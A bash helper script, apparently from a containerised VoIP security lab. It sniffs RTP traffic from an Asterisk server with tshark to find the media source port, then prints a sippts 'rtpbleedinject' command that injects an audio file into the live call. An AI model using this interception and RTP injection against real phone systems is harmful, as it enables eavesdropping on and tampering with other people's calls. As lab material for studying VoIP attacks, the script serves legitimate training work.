#!/bin/bash
# get-attack-cmd.sh

set -e

# Expected RTP source (Asterisk)
SRC_IP="${SRC_IP:-10.10.0.5}"
RTP_PORT_RANGE="${RTP_PORT_RANGE:-10000-10099}"
WIRESHARK_CID="${WIRESHARK_CID:-wireshark}"

# If the user passes --port-only, run in silent mode
PORT_ONLY=false
if [ "$1" == "--port-only" ]; then
    PORT_ONLY=true
fi

if [ "$PORT_ONLY" = false ]; then
    echo "[*] Waiting to intercept RTP traffic..."
fi

# Capture the Asterisk RTP source port (not destination port).
# This avoids selecting the client-side ephemeral port (for example 6738).
PORT=$(
    # Previous implementation kept for traceability:
    # docker exec wireshark tshark -i eth0 \
    # Change rationale: WIRESHARK_CID lets the Makefile target the selected Compose project instance.
    docker exec "${WIRESHARK_CID}" tshark -i eth0 \
        -f "udp portrange ${RTP_PORT_RANGE} and src host ${SRC_IP}" \
        -Y "ip.src == ${SRC_IP}" \
        -c 20 -T fields -e udp.srcport 2>/dev/null \
    | tr -d '\r' \
    | awk 'NF && $1 ~ /^[0-9]+$/ && ($1 % 2) == 0 { print $1; exit }'
)

if [ -z "$PORT" ]; then
    if [ "$PORT_ONLY" = false ]; then
        echo "[!] Error: no RTP source port detected from ${SRC_IP} in range ${RTP_PORT_RANGE}."
        echo "[i] Ensure an active call is running and media is flowing before retrying."
    fi
    exit 1
fi

if [ "$PORT_ONLY" = true ]; then
    # Print only the port number for Makefile usage
    echo "$PORT"
else
    echo "[+] Target port detected: $PORT"
    echo "=========================================================================="
    echo "Command to run:"
    echo -e "\033[1;32mdocker exec sippts sippts rtpbleedinject -i ${SRC_IP} -r $PORT -f /audio_inject.wav -p 0\033[0m"
fi
